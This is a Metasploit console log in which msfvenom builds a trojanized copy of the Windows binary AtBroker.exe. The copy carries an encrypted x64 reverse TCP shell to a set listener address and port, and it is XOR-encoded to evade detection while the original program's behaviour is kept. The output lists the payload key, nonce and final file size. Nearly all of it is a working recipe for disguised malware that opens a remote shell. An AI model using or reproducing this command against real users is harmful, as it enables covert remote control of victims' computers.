msf6 exploit(multi/handler) > msfvenom -a x64 --platform windows -x AtBroker.exe -k -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.0.14 LPORT=3636 -b "\x00\x0a\x0d" -e x64/xor_dynamic -f exe-only > atbroker2.exe
[*] exec: msfvenom -a x64 --platform windows -x AtBroker.exe -k -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.0.14 LPORT=3636 -b "\x00\x0a\x0d" -e x64/xor_dynamic -f exe-only > atbroker2.exe

[!] Database is not active! Payload key and nonce must be manually set when creating handler
[-] Please ensure payload key and nonce match when setting up handler: c0b0db2896341529807ebe0042ded0ec - 474f446ba3dd
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor_dynamic
x64/xor_dynamic succeeded with size 4239 (iteration=0)
x64/xor_dynamic chosen with final size 4239
Payload size: 4239 bytes
Final size of exe-only file: 78848 bytes
